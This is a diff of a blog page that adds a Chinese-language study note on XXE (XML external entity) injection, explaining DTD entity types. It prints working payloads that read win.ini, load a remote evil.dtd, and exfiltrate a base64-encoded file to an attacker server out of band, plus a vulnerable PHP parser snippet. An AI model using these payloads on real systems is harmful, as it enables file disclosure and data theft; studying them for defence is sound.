@@ -185,7 +185,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a>
+                        <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/漏洞挖掘/" style="font-size: 10px;">漏洞挖掘</a>
                     </div>
                 </section>
                 
@@ -255,6 +255,91 @@
     </div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-2018-8-20-xxe_学习" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/08/20/2018-8-20-xxe_学习/" class="article-date">
+      <time datetime="2018-08-19T16:00:00.000Z" itemprop="datePublished">2018-08-20</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/20/2018-8-20-xxe_学习/">xxe_学习</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="xxe-学习"><a href="#xxe-学习" class="headerlink" title="xxe_学习"></a>xxe_学习</h2><h3 id="基础学习"><a href="#基础学习" class="headerlink" title="基础学习"></a>基础学习</h3><h4 id="利用环境月约束"><a href="#利用环境月约束" class="headerlink" title="利用环境月约束"></a>利用环境月约束</h4><ul>
+<li>libxml2.9.1(php5.3)之前的版本都默认解析外部</li>
+<li>查看方法，编辑一个phpinfo文件，可以直接查看到libxml的版本<h4 id="DTD的基础知识："><a href="#DTD的基础知识：" class="headerlink" title="DTD的基础知识："></a>DTD的基础知识：</h4><h5 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h5></li>
+<li>XXE: XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。</li>
+<li>DTD:Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。</li>
+<li>基本的payload结构:<br><img src="https://s1.ax1x.com/2018/08/20/Phh9MT.png" alt=""><h5 id="使用DTD实体攻击方式"><a href="#使用DTD实体攻击方式" class="headerlink" title="使用DTD实体攻击方式:"></a>使用DTD实体攻击方式:</h5></li>
+<li>DTD引用方式:<br>1、内部声明:&lt;&lt;!DOCTYPE 根元素 [元素声明]&gt;&gt;<br>2、外部声明:&lt;!DOCTYPE 根元素 SYSTEM “外部DTD文档的url” &gt;<br>3、引用公共DTD:&lt;!DOCTYPE 根元素 PUBLIC “DTD标识名” “公共DTD的url” &gt;</li>
+<li><p>DTD实体声明:<br>1、内部实体声明</p>
+<pre><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot; &gt;
+</code></pre><p>一个实体由三部分构成:&amp;符号, 实体名称, 分号 (;)，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号。<br>  实例：</p>
+<pre><code>1.php源码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$xml=simplexml_load_string($_POST[&apos;xml&apos;]);</span><br><span class="line">print_r($xml);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+传入参数:xml=&lt;!DOCTYPE foo [&lt;!ENTITY aaa &quot;test&quot;&gt;]&gt;&lt;foo&gt;%26aaa;&lt;/foo&gt;
+</code></pre><p>  <img src="https://s1.ax1x.com/2018/08/20/PhhRyT.png" alt=""><br>2、外部实体声明</p>
+<pre><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot; &gt;
+</code></pre><p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示:<br><img src="https://s1.ax1x.com/2018/08/20/Phhv0e.png" alt=""><br><img src="https://s1.ax1x.com/2018/08/20/Ph4Skd.png" alt=""><br>3、参数实体声明：</p>
+<pre><code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot; &gt; 或 &lt;!ENTITY % 实体名称 &quot;URI&quot; &gt;
+</code></pre><p><img src="https://s1.ax1x.com/2018/08/20/Ph4kX8.png" alt=""><br>4、引用公共实体：</p>
+<pre><code>&lt;!ENTITY 实体名称 PUBLIC &quot;public_iD&quot; &quot;URI&quot; &gt;
+</code></pre><h4 id="XXE的利用方式："><a href="#XXE的利用方式：" class="headerlink" title="XXE的利用方式："></a>XXE的利用方式：</h4><h5 id="有回显的情况："><a href="#有回显的情况：" class="headerlink" title="有回显的情况："></a>有回显的情况：</h5>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">2、</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;%xxe;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;evil;&lt;/foo&gt;</span><br><span class="line">外部dtd种的内容：</span><br><span class="line">&lt;!ENTITY evil SYSTEM “file:///c:/windows/win.ini” &gt;</span><br></pre></td></tr></table></figure>
+<h5 id="无回显的情况："><a href="#无回显的情况：" class="headerlink" title="无回显的情况："></a>无回显的情况：</h5><blockquote>
+<p>可以使用外带数据通道提取数据，先使用php://filter获取目标文件的内容，然后将内容以http请求发送到攻击服务器</p>
+<pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">攻击代码：</span><br><span class="line">&lt;!DOCTYPE updateProfile [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./1.php&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1/test.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">test.dtd：</span><br><span class="line">&lt;!ENTITY % all</span><br><span class="line">&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://127.0.0.1/?data=%file;&apos;&gt;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
+</code></pre></blockquote>
+</li>
+</ul>
+<p>有两种情况：<br>    有报错：<br>        <img src="https://s1.ax1x.com/2018/08/20/Ph4Mpq.png" alt=""><br>    没报错：<br>        这种情况我们就要去查看日志文件了。</p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-2018-8-18-ctf_极限利用" class="article article-type-post" itemscope itemprop="blogPost">
   
